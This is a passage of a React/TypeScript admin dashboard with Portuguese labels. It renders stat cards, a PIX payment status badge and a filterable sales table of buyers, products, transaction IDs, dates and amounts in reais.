      <div className="flex items-start justify-between mb-3">
        <div className={`w-10 h-10 rounded-lg bg-gradient-to-br ${color} flex items-center justify-center shadow-lg`}>
          <Icon className="text-white" size={18} />
        </div>
      </div>
      <p className="text-2xl font-bold tracking-tight">{value}</p>
      <p className="text-xs text-slate-500 mt-1">{label}</p>
      {hint && <p className="text-[10px] text-slate-600 mt-2 uppercase tracking-wider">{hint}</p>}
    </div>
  );
}

function Panel({ title, action, children }: any) {
  return (
    <div className="bg-slate-900 border border-slate-800 rounded-xl p-5">
      <div className="flex items-center justify-between mb-3">
        <h3 className="font-semibold">{title}</h3>
        {action}
      </div>
      <div>{children}</div>
    </div>
  );
}

function sectionLabel(s: string) {
  if (s === "main") return "Principal";
  if (s === "tambem") return "Também interessar";
  if (s === "mais") return "Mais procurados";
  return s;
}

function PixStatusBadge({ status }: { status: string }) {
  const isPaid = ["PAID", "APPROVED", "CONFIRMED"].includes(status);
  const isFail = ["FAILED", "CANCELLED", "REFUNDED", "EXPIRED"].includes(status);
  if (isPaid) return (
    <span className="inline-flex items-center gap-1 text-[10px] font-bold px-2 py-1 rounded-full bg-emerald-500/15 text-emerald-300 border border-emerald-500/30">
      <CheckCircle2 size={11} /> PAGO
    </span>
  );
  if (isFail) return (
    <span className="inline-flex items-center gap-1 text-[10px] font-bold px-2 py-1 rounded-full bg-red-500/15 text-red-300 border border-red-500/30">
      <XCircle size={11} /> {status}
    </span>
  );
  return (
    <span className="inline-flex items-center gap-1 text-[10px] font-bold px-2 py-1 rounded-full bg-amber-500/15 text-amber-300 border border-amber-500/30">
      <Clock size={11} className="animate-pulse" /> AGUARDANDO
    </span>
  );
}

function VendasTab({ pixes, listings, stats, copyText, copied }: {
  pixes: Pix[]; listings: Listing[]; stats: any;
  copyText: (t: string, k: string) => void; copied: string | null;
}) {
  const [filter, setFilter] = useState<"all" | "paid" | "pending" | "failed">("all");
  const [search, setSearch] = useState("");

  const listingTitle = (id: string | null) => listings.find(l => l.id === id)?.title ?? "—";

  const filtered = useMemo(() => {
    return pixes.filter(p => {
      if (filter === "paid" && !["PAID","APPROVED","CONFIRMED"].includes(p.status)) return false;
      if (filter === "pending" && p.status !== "PENDING") return false;
      if (filter === "failed" && !["FAILED","CANCELLED","REFUNDED","EXPIRED"].includes(p.status)) return false;
      if (search) {
        const q = search.toLowerCase();
        const hay = `${p.payer_name ?? ""} ${p.payer_email ?? ""} ${p.payer_document ?? ""} ${p.transaction_id} ${listingTitle(p.listing_id)}`.toLowerCase();
        if (!hay.includes(q)) return false;
      }
      return true;
    });
  }, [pixes, filter, search, listings]);

  return (
    <div className="space-y-4">
      <div className="grid grid-cols-2 lg:grid-cols-4 gap-3">
        <StatCard icon={DollarSign} label="Receita total" value={`R$ ${stats.receita.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}`} hint={`R$ ${stats.receitaHoje.toLocaleString("pt-BR", { minimumFractionDigits: 2 })} hoje`} color="from-emerald-500 to-green-500" />
        <StatCard icon={CheckCircle2} label="Pagas" value={stats.vendas} color="from-purple-500 to-pink-500" />
        <StatCard icon={Clock} label="Pendentes" value={stats.pendentes} color="from-amber-500 to-orange-500" />
        <StatCard icon={CreditCard} label="Transações" value={pixes.length} color="from-blue-500 to-cyan-500" />
      </div>

      <div className="flex flex-wrap gap-2 items-center justify-between">
        <div className="flex gap-1.5 bg-slate-900 border border-slate-800 rounded-lg p-1">
          {([["all","Todas"],["paid","Pagas"],["pending","Aguardando"],["failed","Falhas"]] as const).map(([k,l]) => (
            <button key={k} onClick={() => setFilter(k)}
              className={`text-xs font-semibold px-3 py-1.5 rounded-md transition ${filter === k ? "bg-purple-500/20 text-purple-300" : "text-slate-400 hover:text-white"}`}>
              {l}
            </button>
          ))}
        </div>
        <div className="relative flex-1 max-w-xs min-w-[200px]">
          <Search size={14} className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500" />
          <input value={search} onChange={e => setSearch(e.target.value)} placeholder="Buscar comprador, ID..."
            className="w-full bg-slate-900 border border-slate-800 rounded-lg pl-9 pr-3 py-2 text-xs text-white placeholder-slate-500 focus:border-purple-500 focus:outline-none" />
        </div>
      </div>

      <div className="bg-slate-900 border border-slate-800 rounded-xl overflow-hidden">
        <div className="overflow-x-auto">
          <table className="w-full text-sm min-w-[760px]">
            <thead className="bg-slate-950/50 text-[11px] uppercase tracking-wider text-slate-500">
              <tr>
                <th className="text-left px-4 py-3 font-medium">Status</th>
                <th className="text-left px-4 py-3 font-medium">Comprador</th>
                <th className="text-left px-4 py-3 font-medium">Produto</th>
                <th className="text-left px-4 py-3 font-medium">Transação</th>
                <th className="text-left px-4 py-3 font-medium">Data</th>
                <th className="text-right px-4 py-3 font-medium">Valor</th>
              </tr>
            </thead>
            <tbody>
              {filtered.map(p => (
                <tr key={p.id} className="border-t border-slate-800 hover:bg-slate-800/30">
                  <td className="px-4 py-3"><PixStatusBadge status={p.status} /></td>
                  <td className="px-4 py-3">
                    <p className="font-medium text-white truncate max-w-[180px]">{p.payer_name ?? "—"}</p>
                    {p.payer_document && <p className="text-[11px] text-slate-500 font-mono">{p.payer_document}</p>}
                  </td>
                  <td className="px-4 py-3 text-slate-300 truncate max-w-[200px]">{listingTitle(p.listing_id)}</td>
                  <td className="px-4 py-3">
                    <button onClick={() => copyText(p.transaction_id, `tx-${p.id}`)} className="text-[11px] font-mono text-slate-400 hover:text-purple-300 flex items-center gap-1">
                      {p.transaction_id.slice(0, 12)}…
                      {copied === `tx-${p.id}` ? <Check size={11} className="text-emerald-400" /> : <Copy size={11} />}
                    </button>
                  </td>
                  <td className="px-4 py-3 text-xs text-slate-400">
                    {new Date(p.created_at).toLocaleString("pt-BR")}
                    {p.paid_at && <p className="text-[10px] text-emerald-400">✓ {new Date(p.paid_at).toLocaleTimeString("pt-BR")}</p>}
                  </td>
                  <td className="px-4 py-3 text-right font-bold text-emerald-400">
                    R$ {(p.amount_cents/100).toLocaleString("pt-BR", { minimumFractionDigits: 2 })}
                  </td>
                </tr>
              ))}
              {filtered.length === 0 && (
                <tr><td colSpan={6} className="px-4 py-12 text-center text-slate-500 text-sm">Nenhuma transação encontrada</td></tr>
              )}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}
